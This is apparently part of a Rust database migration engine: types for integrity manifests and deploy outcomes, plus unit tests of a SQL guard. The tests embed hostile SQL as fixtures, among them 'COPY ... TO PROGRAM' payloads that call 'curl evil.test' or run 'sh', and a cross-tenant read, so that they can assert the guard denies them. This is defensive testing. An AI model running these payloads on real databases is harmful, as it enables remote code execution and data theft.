        // P6a — each SQLite rebuild's JOURNAL migration (`r.migration`: its version is
        // the rebuild's identity, its checksum certifies the rebuilt shape, its flags
        // gate it) is part of the effective executed set, so the integrity manifest
        // covers it too. Empty on PG (no rebuilds), so the PG manifest is unchanged.
        for rebuild in &self.rebuilds {
            set.push(rebuild.migration.clone());
        }
        set
    }

    /// Compute the integrity manifest over this plan's
    /// [`effective_set`](Self::effective_set) — the SINGLE implementation both the
    /// control plane (stamp side) and
    /// [`apply_declarative_verified`](MigrationEngine::apply_declarative_verified)
    /// (verify side) call, so the stamped hash and the verified hash can never
    /// diverge.
    ///
    /// The control plane MUST call this over the SAME generated plan instance it
    /// will later apply (declarative versions are minted per `plan_declarative`
    /// call, so the manifest is only stable for one instance — see
    /// [`apply_declarative_verified`](MigrationEngine::apply_declarative_verified)'s
    /// determinism caveat).
    ///
    /// # Carrying the plan across the stamp → apply boundary
    ///
    /// Because the manifest is only valid for one generated [`DeclarativeDeployPlan`]
    /// instance, the control plane must hold THAT instance (not re-generate) between
    /// computing the stamp here and calling
    /// [`apply_declarative_verified`](MigrationEngine::apply_declarative_verified).
    /// If the stamp and apply happen in the SAME process / request the plan is held
    /// in memory and no serialization is needed. If they are split across a
    /// boundary, the plan must be carried as-is; note that
    /// [`DeclarativeDeployPlan`] is deliberately NOT `serde`-serializable today
    /// (its [`crate::guard::GuardReport`]/[`BackfillSpec`](crate::model::backfill::BackfillSpec) members
    /// are not, and deriving it would
    /// cascade invasively) — so a split-boundary control plane either keeps the
    /// generated plan in a server-side store keyed by an opaque token, or
    /// (post-launch, if a wire shape is needed) the derive is added deliberately
    /// in one patch across the member types. The manifest hash itself
    /// ([`ManifestHash`]) IS `serde`-serializable and is the only value that must
    /// cross the trust boundary out-of-band.
    #[must_use]
    pub fn manifest(&self) -> ManifestHash {
        compute_manifest(&self.effective_set())
    }
}

/// The result of
/// [`MigrationEngine::apply_declarative`](MigrationEngine::apply_declarative).
#[derive(Debug, Clone)]
pub struct DeclarativeDeployOutcome {
    /// The combined apply outcome for the plain set + every rename's EXPAND
    /// (E1/E2 + the journaled E3 marker, after the real backfill).
    pub applied: ApplyOutcome,
    /// The DEFERRED contract migrations (per rename: DROP TRIGGER C1 + DROP
    /// COLUMN `<from>` C2), to be applied in a SUBSEQUENT deploy via the normal
    /// gated [`apply`](MigrationEngine::apply) AFTER app code switches to `<to>`.
    /// Empty when the deploy had no renames. These are gated
    /// (`requires_approval`; C2 is `destructive`).
    pub pending_contract: Vec<Migration>,
    /// PR9d MED — the cross-deploy pending-contract OBLIGATIONS this plan opened
    /// (one per online-rename EXPAND that recorded a fresh `pending` row this
    /// invocation). The control-layer IR loop accumulates these across all files in
    /// a deploy and — if a LATER file fails at apply — drives the SHARED
    /// `build_abort_steps` over exactly THIS deploy's obligations
    /// ([`MigrationEngine::abort_same_deploy_expands`]) to roll back the
    /// half-renamed table BEFORE surfacing the creator's 4xx (no half-state). Empty
    /// when the plan opened no new obligation (no rename, or an idempotent re-run
    /// that net-applied-skipped the EXPAND).
    pub opened_obligations: Vec<crate::apply::journal::PendingContract>,
}

/// A failure from
/// [`MigrationEngine::apply_declarative`](MigrationEngine::apply_declarative).
#[derive(Debug, thiserror::Error)]
pub enum DeclarativeApplyError {
    /// Applying the gated plain set failed (guard denial, missing approval, or an
    /// executor failure). No rename expand ran.
    #[error(transparent)]
    Plain(#[from] EngineError),
    /// A rename's expand / backfill failed. Earlier work (the plain set + any
    /// prior rename's expand) is already applied; the backfill is resumable.
    #[error(transparent)]
    Expand(#[from] OnlineError),
}

/// A failure from [`MigrationEngine::run_expand`].
#[derive(Debug, thiserror::Error)]
pub enum OnlineError {
    /// The online expand needs explicit [`Approval::Approved`] (its backfill
    /// mutates data). Nothing was applied.
    #[error("online expand requires approval (the backfill mutates data) but none was given")]
    Approval,
    /// **PR9b — per-version approval scope (executor-layer defense in depth).** The
    /// expand is approved ([`Approval::Approved`]) but the rename's PLAN-GROUP
    /// version is NOT in the operator's reviewed
    /// [`ApprovalScope::Versions`](crate::ApprovalScope::Versions) set — the
    /// executor-layer mirror of the engine's EXPAND scope gate, so a direct
    /// `run_online` / `run_expand_pg` caller cannot mirror data for a rename the
    /// operator never individually reviewed. Nothing was applied.
    #[error(
        "online expand for version '{version}' is not in the approved version scope \
         (per-version approval required)"
    )]
    ApprovalNotScoped {
        /// The rename's PLAN-GROUP version the scope refused.
        version: String,
    },
    /// Applying E1/E2 or the E3 backfill marker failed.
    #[error(transparent)]
    Apply(#[from] ApplyError),
    /// The backfill step failed — E3 is NOT journaled, so the gate keeps the
    /// expand incomplete (the contract stays blocked) and the backfill is
    /// resumable on a re-run.
    #[error(transparent)]
    Backfill(#[from] crate::apply::backend::BackfillError),
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::plan::author::{AuthorRequest, Column, DeterministicAuthor, MigrationAuthor, RawSqlAuthor};

    fn guard_cfg() -> GuardConfig {
        GuardConfig::confined("proj_acme")
    }

    fn det() -> DeterministicAuthor {
        DeterministicAuthor::new("proj_acme", "app_acme")
    }

    #[test]
    fn plan_of_safe_additive_set_needs_no_approval_and_has_no_denials() {
        let create = det()
            .author(&AuthorRequest::CreateTable {
                name: "orders".into(),
                columns: vec![Column {
                    name: "id".into(),
                    ty: "bigint".into(),
                    nullable: false,
                }],
            })
            .unwrap();
        let add = det()
            .author(&AuthorRequest::AddColumn {
                table: "orders".into(),
                column: Column {
                    name: "note".into(),
                    ty: "text".into(),
                    nullable: true,
                },
            })
            .unwrap();
        let set: Vec<Migration> = create.into_iter().chain(add).collect();

        let plan = MigrationEngine::new().plan(&set, &guard_cfg());
        assert_eq!(plan.items.len(), 2);
        assert!(plan.denied.is_empty());
        assert!(!plan.destructive);
        assert!(!plan.requires_approval);
        assert!(plan.is_appliable());
    }

    #[test]
    fn plan_with_a_drop_is_destructive_and_requires_approval() {
        let drop = RawSqlAuthor::new("proj_acme", "app_acme")
            .wrap("drop_legacy", "DROP TABLE \"proj_acme\".\"legacy\"", None)
            .unwrap();
        let plan = MigrationEngine::new().plan(&[drop], &guard_cfg());
        assert!(plan.denied.is_empty(), "DROP is flagged, not denied");
        assert!(plan.destructive);
        assert!(plan.requires_approval);
        // The item's own report agrees.
        assert!(plan.items[0].report.destructive);
    }

    #[test]
    fn plan_with_a_dangerous_up_records_a_denial() {
        // COPY … TO PROGRAM is shell RCE — hard-denied (not merely flagged).
        let evil = RawSqlAuthor::new("proj_acme", "app_acme")
            .wrap(
                "rce",
                "COPY \"proj_acme\".\"t\" TO PROGRAM 'curl evil.test'",
                None,
            )
            .unwrap();
        let plan = MigrationEngine::new().plan(std::slice::from_ref(&evil), &guard_cfg());
        assert_eq!(plan.items.len(), 0, "denied migration is not a planned item");
        assert_eq!(plan.denied.len(), 1);
        assert_eq!(plan.denied[0].0, evil.version.as_str());
        assert!(!plan.is_appliable());
    }

    #[test]
    fn plan_collects_every_denial_not_just_the_first() {
        let raw = RawSqlAuthor::new("proj_acme", "app_acme");
        let a = raw
            .wrap("rce", "COPY \"proj_acme\".\"t\" TO PROGRAM 'sh'", None)
            .unwrap();
        let b = raw.wrap("xtenant", "SELECT * FROM control.users", None).unwrap();
        let plan = MigrationEngine::new().plan(&[a, b], &guard_cfg());
        assert_eq!(plan.denied.len(), 2, "both denials surface");
    }

    #[test]
    fn expand_contract_rename_set_plans_with_zero_denials() {
        use crate::render::expand_contract::{ExpandContractAuthor, OnlineIntent};
        let plan_in = ExpandContractAuthor::new("proj_acme", "app_acme")
            .author(&OnlineIntent::RenameColumn {
                table: "users".into(),
                from: "email".into(),
                to: "email_address".into(),
                ty: "text".into(),
            })
            .expect("author");
        // The whole expand+contract set passes the guard with NO denials — the
        // dual-write fn (INVOKER plpgsql, project-qualified), the trigger, the
        // backfill marker, and the gated drops are all guard-safe.
        let set = plan_in.all();
        let plan = MigrationEngine::new().plan(&set, &guard_cfg());
        assert!(
            plan.denied.is_empty(),
            "expand-contract set must have zero denials, got {:?}",
            plan.denied
        );
        assert_eq!(plan.items.len(), set.len(), "every migration is planned");
        // The contract DROP COLUMN makes the set destructive ⇒ requires approval.
        assert!(plan.destructive);
        assert!(plan.requires_approval);
    }
}
